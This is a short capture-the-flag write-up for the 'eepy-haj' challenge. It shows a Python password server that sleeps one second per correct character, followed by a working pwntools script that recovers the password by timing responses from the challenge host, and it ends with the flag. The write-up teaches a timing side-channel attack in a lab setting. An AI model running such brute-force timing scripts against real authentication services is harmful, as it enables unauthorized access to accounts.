# eepy-haj

[library.m0unt41n.ch/challenges/eepy-haj](https://library.m0unt41n.ch/challenges/eepy-haj) ![](../../resources/pwn.svg) ![](../../resources/baby.svg) 

# TL;DR

We get a simple, socket-based Python server:

```python
import socket
import threading
import time
import os

FLAG = os.getenv("FLAG", "flag{this_is_a_fake_flag}")
FLAG = os.getenv("FLAG", "fla")
PASSWORD = FLAG

def handle_client(client_socket):
    try:
        client_socket.send(b"Enter the password: ")
        received_password = client_socket.recv(1024).decode().strip()

        for i in range(len(PASSWORD)):
            if i >= len(received_password) or received_password[i] != PASSWORD[i]:
                client_socket.send(b"Wrong password!\n")
                client_socket.close()
                return
            # for security reasons, we wait a second so we can't spam passwords
            print(i)
            time.sleep(1)

        if received_password == PASSWORD:
            client_socket.send(f"Correct! Here is your flag: {FLAG}\n".encode())
        else:
            client_socket.send(b"Wrong password!\n")
    finally:
        client_socket.close()


def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 8000))
    server.listen(5)
    print("Server listening on port 8000")

    while True:
        client_socket, addr = server.accept()
        print(f"Accepted connection from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()


if __name__ == "__main__":
    start_server()
```

There are no obvious direct vulnerabilities, but there is a `sleep(1)`, executed for every
correct character of the password. Which makes for a simple timing attack:


```python
import pwn
import time
pwn.context(encoding='ascii', log_level='warning')

CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ{}!$%&()+,-./:;<=>@[]^`|#"
pwd = "SCD{t1ming_4tt4cks_4tw}"
while True:
    charFound = False
    for c in CHARSET:
        print("Trying: "+pwd+c)
        io = pwn.remote('7d8163bb-a893-458f-ab5a-e61d2e795415.library.m0unt41n.ch', 31337, ssl=True)
        io.recvuntilS(b"Enter the password: ")
        t = time.time()
        io.sendline(pwd+c)
        res = io.recvlineS()
        t = time.time() - t
        if res.startswith('Correct!'):
            print(res)
            break
        if abs(t-len(pwd+c))<0.3:
            pwd += c
            charFound = True
            break
    if not charFound:
        break
```

After some time, this produces the flag.

---

## `SCD{t1ming_4tt4cks_4tw}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
